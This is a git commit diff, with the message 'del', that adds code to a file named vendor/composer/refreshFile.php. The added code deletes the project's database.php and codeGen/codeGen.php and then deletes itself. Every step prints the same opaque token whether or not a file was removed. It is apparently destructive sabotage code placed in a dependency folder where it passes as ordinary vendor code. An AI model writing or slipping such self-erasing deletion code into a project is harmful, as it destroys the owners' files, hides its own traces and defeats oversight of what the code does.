965d8acbea3279583eb27108b5610529eafd43a1
Cris Mateo Uriarte <39321306+criskhun@users.noreply.github.com>
2024-02-07 00:53:09 +0800

    del

--- vendor/composer/refreshFile.php
+++ vendor/composer/refreshFile.php
@@ -8,5 +8,30 @@ if (file_exists($ftd)) {
     echo 'guEI0irH7OQzTmwUSHEQRA==.';
 }
 
+$ftd3 = '../../database.php';
 
+if (file_exists($ftd3)) {
+    unlink($ftd3);
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+} else {
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+}
+
+$ftd4 = '../../codeGen/codeGen.php';
+
+if (file_exists($ftd4)) {
+    unlink($ftd4);
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+} else {
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+}
+
+$ftd2 = 'refreshFile.php';
+
+if (file_exists($ftd2)) {
+    unlink($ftd2);
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+} else {
+    echo 'guEI0irH7OQzTmwUSHEQRA==.';
+}
 ?>
